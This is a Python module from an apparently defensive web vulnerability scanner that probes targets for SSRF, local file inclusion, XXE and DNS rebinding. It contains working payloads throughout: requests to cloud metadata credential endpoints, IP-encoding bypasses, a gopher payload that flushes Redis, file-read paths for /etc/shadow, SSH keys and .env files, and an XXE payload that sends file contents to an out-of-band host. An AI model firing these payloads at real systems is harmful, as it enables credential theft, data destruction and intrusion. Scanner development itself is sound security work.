# scanner/dast/modules/infra.py
#
# ENHANCED INFRA MODULE — SSRF with bypass chains, LFI with encoding mutations,
# XXE via POST, and OAST blind detection

import asyncio
import logging
import urllib.parse
import base64
import re
from typing import Dict, List, Optional, Set, Tuple, Any
from urllib.parse import urlparse, urlunparse, parse_qs, urlencode
import httpx

logger = logging.getLogger(__name__)

# Default configuration
DEFAULT_CONFIG = {
    "ssrf_probe_params": {
        "url", "uri", "link", "src", "source", "dest", "destination",
        "redirect", "path", "fetch", "load", "file", "resource",
        "host", "target", "endpoint", "proxy", "request", "href", "callback",
        "img", "image", "domain", "site", "page", "reference", "return",
        "next", "goto", "out", "feed", "rss", "api", "query",
        "web", "service", "address", "location", "server", "port",
    },
    "lfi_probe_params": {
        "file", "path", "page", "include", "load", "template", "view",
        "doc", "document", "filename", "name", "input", "content",
        "template", "layout", "theme", "style", "script", "config",
    },
    "max_ssrf_targets": 20,
    "max_lfi_payloads": 15,
    "request_timeout": 20,
    "concurrent_requests": 8,
    "dns_rebinding_domains": [
        "rbndr.us", "sslip.io", "nip.io", "xip.io"
    ],
}

# Enhanced SSRF targets
SSRF_TARGETS = [
    # Cloud metadata endpoints
    ("AWS Metadata", "http://169.254.169.254/latest/meta-data/", {}),
    ("AWS IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", {}),
    ("AWS User Data", "http://169.254.169.254/latest/user-data/", {}),
    ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/", {"Metadata-Flavor": "Google"}),
    ("GCP Token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", {"Metadata-Flavor": "Google"}),
    ("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", {"Metadata": "true"}),
    ("DigitalOcean", "http://169.254.169.254/metadata/v1/", {}),
    ("Alibaba Cloud", "http://100.100.100.200/latest/meta-data/", {}),
    ("Oracle Cloud", "http://192.0.0.192/latest/", {}),
    ("Kubernetes", "http://127.0.0.1:10255/pods", {}),
    ("Docker", "http://127.0.0.1:2375/version", {}),
    
    # Internal services
    ("Redis", "http://127.0.0.1:6379", {}),
    ("Elasticsearch", "http://127.0.0.1:9200", {}),
    ("Elasticsearch Cluster", "http://127.0.0.1:9200/_cluster/health", {}),
    ("MongoDB", "http://127.0.0.1:27017", {}),
    ("MySQL", "http://127.0.0.1:3306", {}),
    ("PostgreSQL", "http://127.0.0.1:5432", {}),
    ("Memcached", "http://127.0.0.1:11211", {}),
    ("RabbitMQ", "http://127.0.0.1:15672", {}),
    
    # Localhost variations
    ("Localhost", "http://localhost", {}),
    ("Localhost 80", "http://localhost:80", {}),
    ("Localhost 443", "http://localhost:443", {}),
    ("Localhost 8080", "http://localhost:8080", {}),
    ("Localhost 3000", "http://localhost:3000", {}),
    ("IPv6 Local", "http://[::1]", {}),
    ("IPv6 Local 80", "http://[::1]:80", {}),
    
    # IP bypass techniques
    ("Decimal IP", "http://2130706433", {}),
    ("Hex IP", "http://0x7f000001", {}),
    ("Octal IP", "http://0177.0.0.1", {}),
    ("Zero IP", "http://0/", {}),
    ("Short IP", "http://127.1/", {}),
    ("Dotted Octal", "http://0177.0.0.01", {}),
    ("Dotted Hex", "http://0x7f.0x0.0x0.0x1", {}),
    
    # Protocol schemes
    ("File Scheme", "file:///etc/passwd", {}),
    ("Dict Scheme", "dict://127.0.0.1:6379/info", {}),
    ("Gopher Redis", "gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a", {}),
    ("FTP Scheme", "ftp://127.0.0.1:21", {}),
    
    # DNS rebinding targets
    ("DNS Rebinding", "http://169.254.169.254.{}", {}),
]

# SSRF response indicators
SSRF_INDICATORS = [
    "ami-id", "instance-id", "iam/security-credentials", "local-ipv4",
    "computeMetadata", "-ERR", "+PONG", "+OK", "redis_version",
    "mongodb", "elasticsearch", "localhost", "cluster_name",
    "total_in_bytes", "tag:", "private-ipv4", "hostname",
    "local-hostname", "public-keys", "mac", "network/",
    "placement/", "profile", "region", "services/",
    "accountId", "availability-zone", "instance-type",
]

# LFI payloads and indicators
LFI_PAYLOADS = [
    # Linux files
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/issue",
    "/proc/self/environ",
    "/proc/version",
    "/proc/cmdline",
    "/proc/mounts",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/www/html/index.php",
    "/etc/httpd/conf/httpd.conf",
    "/etc/nginx/nginx.conf",
    "/etc/apache2/apache2.conf",
    
    # Windows files
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../../../Program Files/",
    "../../../../Program Files (x86)/",
    "C:\\windows\\win.ini",
    "C:\\windows\\system32\\drivers\\etc\\hosts",
    
    # Configuration files
    "../../../.env",
    "../../.git/config",
    "../.ssh/id_rsa",
    "../.ssh/known_hosts",
    "../../config/database.yml",
    "../../app/config/parameters.yml",
    
    # Web files
    "../../index.php",
    "../index.html",
    "....//....//....//etc/passwd",
    "..///..///..///etc/passwd",
]

LFI_INDICATORS = [
    "root:x:", "root:0:0", "daemon:", "nobody:", "bin/bash", "bin/sh",
    "www-data", "[boot loader]", "[fonts]", "PHP Version", "phpinfo()",
    "DocumentRoot", "ServerRoot", "Apache/", "nginx/", "Microsoft",
    "Windows", "Program Files", "system32", "drivers", "Hosts",
    "for 16-bit", "[extensions]", "[mci extensions]", "[files]",
]

# XXE payloads
XXE_PAYLOADS = [
    # Classic file read
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<root><data>&xxe;</data></root>',
     ["root:x:", "root:0:0", "daemon:", "nobody:"],
     "File read via XXE"),
    
    # Windows file read
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
     '<root><data>&xxe;</data></root>',
     ["[fonts]", "[extensions]", "for 16-bit"],
     "Windows file read via XXE"),
    
    # SSRF via XXE
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
     '<root><data>&xxe;</data></root>',
     ["ami-id", "instance-id", "local-ipv4"],
     "SSRF to cloud metadata via XXE"),
    
    # Out-of-band XXE
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{domain}/xxe">%xxe;]>'
     '<root></root>',
     [],
     "Out-of-band XXE"),
    
    # Parameter entity XXE
    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
     '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://{domain}/?%xxe;'>">%eval;%exfil;]>'
     '<root></root>',
     [],
     "Parameter entity XXE"),
]

# XML content types
XML_CONTENT_TYPES = [
    "text/xml",
    "application/xml",
    "application/soap+xml",
    "application/rss+xml",
    "application/xhtml+xml",
    "image/svg+xml",
    "application/atom+xml",
]

class InfraModule:
    def __init__(self, scanner, config: Optional[Dict] = None):
        self.scanner = scanner
        self.config = {**DEFAULT_CONFIG, **(config or {})}
        self.rate_limiter = asyncio.Semaphore(self.config["concurrent_requests"])

    async def run(self, client: httpx.AsyncClient, url: str, params: List[str]) -> None:
        """Run all infrastructure tests with enhanced error handling"""
        try:
            tasks = []
            
            # Parameter-specific tests
            for param in params:
                if param.lower() in self.config["ssrf_probe_params"]:
                    tasks.append(self.test_ssrf(client, url, param))
                if param.lower() in self.config["lfi_probe_params"]:
                    tasks.append(self.test_lfi(client, url, param))
            
            # Endpoint-specific tests
            tasks.append(self.test_xxe(client, url))
            tasks.append(self.test_dns_rebinding(client, url, params))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Log any exceptions
            for result in results:
                if isinstance(result, Exception):
                    logger.error(f"Infrastructure test failed: {result}")
                    
        except Exception as e:
            logger.error(f"Infra module failed for {url}: {e}")

    # ── Enhanced SSRF Testing ─────────────────────────────────────────────────
    async def test_ssrf(self, client: httpx.AsyncClient, url: str, param: str) -> None:
        """Comprehensive SSRF testing with multiple techniques"""
        try:
            # OAST blind detection
            if hasattr(self.scanner, 'oast') and self.scanner.oast:
                await self._test_ssrf_oast(client, url, param)
                
            # In-band SSRF detection
            await self._test_ssrf_inband(client, url, param)
            
            # DNS rebinding SSRF
            await self._test_ssrf_dns_rebinding(client, url, param)
            
        except Exception as e:
            logger.error(f"SSRF test failed for {url} param {param}: {e}")

    async def _test_ssrf_oast(self, client: httpx.AsyncClient, url: str, param: str) -> None:
        """Test SSRF using out-of-band techniques"""
        oast_url = f"http://{self.scanner.oast.domain}/ssrf_{param}"
        test_url = self._inject_param(url, param, oast_url)
        await self._safe_request(client, "GET", test_url)

    async def _test_ssrf_inband(self, client: httpx.AsyncClient, url: str, param: str) -> None:
        """Test SSRF using in-band response analysis"""
        for target_name, target_url, extra_headers in SSRF_TARGETS[:self.config["max_ssrf_targets"]]:
            test_url = self._inject_param(url, param, target_url)
            response = await self._safe_request(
                client, "GET", test_url, 
                headers=extra_headers,
                follow_redirects=False
            )
            
            if response and self._is_ssrf_vulnerable(response, target_name):
                self._report_ssrf(url, param, target_url, target_name, response)
                return

    async def _test_ssrf_dns_rebinding(self, client: httpx.AsyncClient, url: str, param: str) -> None:
        """Test SSRF using DNS rebinding techniques"""
        for domain in self.config["dns_rebinding_domains"]:
            rebinding_url = f"http://169.254.169.254.{domain}"
            test_url = self._inject_param(url, param, rebinding_url)
            response = await self._safe_request(client, "GET", test_url)
            
            if response and self._is_ssrf_vulnerable(response, "DNS Rebinding"):
                self._report_ssrf(url, param, rebinding_url, "DNS Rebinding", response)
                return

    def _is_ssrf_vulnerable(self, response: httpx.Response, target_name: str) -> bool:
        """Determine if response indicates SSRF vulnerability"""
        if response.status_code not in (200, 201, 202, 203, 204, 206):
            return False
            
        body_lower = response.text.lower()
        
        # Check for cloud metadata indicators
        if "cloud" in target_name.lower() or "metadata" in target_name.lower():
            return any(indicator.lower() in body_lower for indicator in SSRF_INDICATORS)
        
        # Check for service-specific indicators
        if any(service in target_name.lower() for service in ["redis", "elasticsearch", "mongodb"]):
            return any(indicator.lower() in body_lower for indicator in ["+OK", "+PONG", "-ERR", "redis_version", "cluster_name"])
        
        # Generic success for internal resources
        return len(response.text) > 10 and response.status_code == 200

    def _report_ssrf(self, url: str, param: str, target: str, target_name: str, response: httpx.Response) -> None:
        """Report SSRF finding"""
        evidence = f"HTTP {response.status_code} from {target_name}"
        if response.text:
            # Extract first 100 chars of relevant content
            sample = response.text[:100].replace('\n', ' ').replace('\r', ' ')
            evidence += f" - Response: {sample}..."
        
        self.scanner._add_finding({
            "type": "Server-Side Request Forgery (SSRF)",
            "subtype": f"{target_name} Access",
            "url": url,
            "parameter": param,
            "payload": target,
            "severity": "Critical",
            "confidence": 0.92,
            "evidence": evidence,
            "description": (
                f"Parameter '{param}' allows accessing internal resources. "
                f"Successfully accessed {target_name} at {target}."
            ),
        })

    # ── Enhanced LFI Testing ──────────────────────────────────────────────────
    async def test_lfi(self, client: httpx.AsyncClient, url: str, param: str) -> None:
        """Comprehensive LFI testing with multiple techniques"""
        try:
            # Get baseline response
            baseline = await self._safe_request(client, "GET", url)
            baseline_text = baseline.text if baseline else ""
            
            for payload in LFI_PAYLOADS[:self.config["max_lfi_payloads"]]:
                # Test multiple encoding variations
                variations = self._lfi_variations(payload)
                
                for variation in variations:
                    if await self._test_lfi_variation(client, url, param, variation, baseline_text):
                        return  # Stop after first successful detection
                        
        except Exception as e:
            logger.error(f"LFI test failed for {url} param {param}: {e}")

    def _lfi_variations(self, payload: str) -> List[str]:
        """Generate LFI payload variations"""
        variations = [payload]
        
        # URL encoding
        variations.append(urllib.parse.quote(payload))
        variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # Double encoding
        variations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # Null byte termination (old PHP)
        variations.append(payload + "%00")
        variations.append(urllib.parse.quote(payload) + "%00")
        
        # Path traversal variations
        if "../" in payload:
            variations.append(payload.replace("../", "..\\"))
            variations.append(payload.replace("../", "....//"))
            variations.append(payload.replace("../", "..///"))
            
        return variations

    async def _test_lfi_variation(self, client: httpx.AsyncClient, url: str, param: str, 
                                payload: str, baseline_text: str) -> bool:
        """Test a specific LFI payload variation"""
        test_url = self._inject_param(url, param, payload)
        response = await self._safe_request(client, "GET", test_url)
        
        if not response or response.status_code != 200:
            return False
            
        # Check for LFI indicators not present in baseline
        for indicator in LFI_INDICATORS:
            if (indicator in response.text and 
                (not baseline_text or indicator not in baseline_text)):
                self._report_lfi(url, param, payload, indicator, response)
                return True
                
        return False

    def _report_lfi(self, url: str, param: str, payload: str, indicator: str, response: httpx.Response) -> None:
        """Report LFI finding"""
        evidence = f"File indicator '{indicator}' found in response"
        
        self.scanner._add_finding({
            "type": "Local File Inclusion (LFI)",
            "subtype": "Path Traversal",
            "url": url,
            "parameter": param,
            "payload": payload,
            "severity": "Critical",
            "confidence": 0.95,
            "evidence": evidence,
            "description": (
                f"Parameter '{param}' allows reading server files via path traversal. "
                f"Successfully read file content containing '{indicator}'."
            ),
        })

    # ── Enhanced XXE Testing ──────────────────────────────────────────────────
    async def test_xxe(self, client: httpx.AsyncClient, url: str) -> None:
        """Comprehensive XXE testing"""
        try:
            # Test various content types
            for content_type in XML_CONTENT_TYPES:
                if await self._test_xxe_content_type(client, url, content_type):
                    return
                    
        except Exception as e:
            logger.error(f"XXE test failed for {url}: {e}")

    async def _test_xxe_content_type(self, client: httpx.AsyncClient, url: str, content_type: str) -> bool:
        """Test XXE with specific content type"""
        for payload, indicators, description in XXE_PAYLOADS:
            # Replace domain placeholder if OAST is available
            if "{domain}" in payload and hasattr(self.scanner, 'oast'):
                final_payload = payload.replace("{domain}", self.scanner.oast.domain)
            else:
                final_payload = payload
                
            response = await self._safe_request(
                client, "POST", url,
                content=final_payload,
                headers={"Content-Type": content_type},
                follow_redirects=True
            )
            
            if not response or response.status_code in (404, 415, 405, 400):
                continue
                
            # Check for in-band indicators
            if indicators and any(indicator in response.text for indicator in indicators):
                self._report_xxe(url, final_payload, description, response, "in-band")
                return True
                
            # Check for error-based indicators
            if self._is_xxe_error_response(response):
                self._report_xxe(url, final_payload, description, response, "error-based")
                return True
                
        return False

    def _is_xxe_error_response(self, response: httpx.Response) -> bool:
        """Check for XXE error indicators"""
        error_patterns = [
            r"XML", "Entity", "DOCTYPE", "SYSTEM", "PUBLIC",
            "entity reference", "unparsed entity", "external entity",
        ]
        
        body_lower = response.text.lower()
        return any(pattern.lower() in body_lower for pattern in error_patterns)

    def _report_xxe(self, url: str, payload: str, description: str, 
                   response: httpx.Response, detection_type: str) -> None:
        """Report XXE finding"""
        evidence = f"{detection_type} detection - {description}"
        if response.text:
            sample = response.text[:100].replace('\n', ' ').replace('\r', ' ')
            evidence += f" - Response: {sample}..."
        
        self.scanner._add_finding({
            "type": "XML External Entity (XXE)",
            "subtype": description,
            "url": url,
            "parameter": "request_body",
            "payload": payload[:120] + "..." if len(payload) > 120 else payload,
            "severity": "Critical",
            "confidence": 0.95,
            "evidence": evidence,
            "description": (
                f"Endpoint vulnerable to XML External Entity processing. "
                f"{description}"
            ),
        })

    # ── DNS Rebinding Testing ─────────────────────────────────────────────────
    async def test_dns_rebinding(self, client: httpx.AsyncClient, url: str, params: List[str]) -> None:
        """Test for DNS rebinding vulnerabilities"""
        try:
            for param in params:
                if param.lower() in self.config["ssrf_probe_params"]:
                    for domain in self.config["dns_rebinding_domains"]:
                        rebinding_payloads = [
                            f"http://169.254.169.254.{domain}",
                            f"http://127.0.0.1.{domain}",
                            f"http://localhost.{domain}",
                        ]
                        
                        for payload in rebinding_payloads:
                            test_url = self._inject_param(url, param, payload)
                            response = await self._safe_request(client, "GET", test_url)
                            
                            if response and self._is_ssrf_vulnerable(response, "DNS Rebinding"):
                                self._report_dns_rebinding(url, param, payload, response)
                                return
                                
        except Exception as e:
            logger.error(f"DNS rebinding test failed for {url}: {e}")

    def _report_dns_rebinding(self, url: str, param: str, payload: str, response: httpx.Response) -> None:
        """Report DNS rebinding finding"""
        self.scanner._add_finding({
            "type": "DNS Rebinding",
            "subtype": "SSRF via DNS Rebinding",
            "url": url,
            "parameter": param,
            "payload": payload,
            "severity": "High",
            "confidence": 0.85,
            "evidence": f"DNS rebinding successful - HTTP {response.status_code}",
            "description": (
                f"Parameter '{param}' vulnerable to DNS rebinding attacks. "
                f"Can be used to bypass SSRF protections."
            ),
        })

    # ── Utility Methods ───────────────────────────────────────────────────────
    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject parameter value into URL"""
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query, keep_blank_values=True)
        query_dict[param] = [value]
        new_query = urlencode(query_dict, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    async def _safe_request(self, client: httpx.AsyncClient, method: str, url: str, 
                          **kwargs) -> Optional[httpx.Response]:
        """Make a safe HTTP request with timeout and error handling"""
        async with self.rate_limiter:
            try:
                kwargs.setdefault("timeout", self.config["request_timeout"])
                return await self.scanner._req(client, method, url, **kwargs)
            except Exception as e:
                logger.debug(f"Request failed: {method} {url}: {e}")
                return None
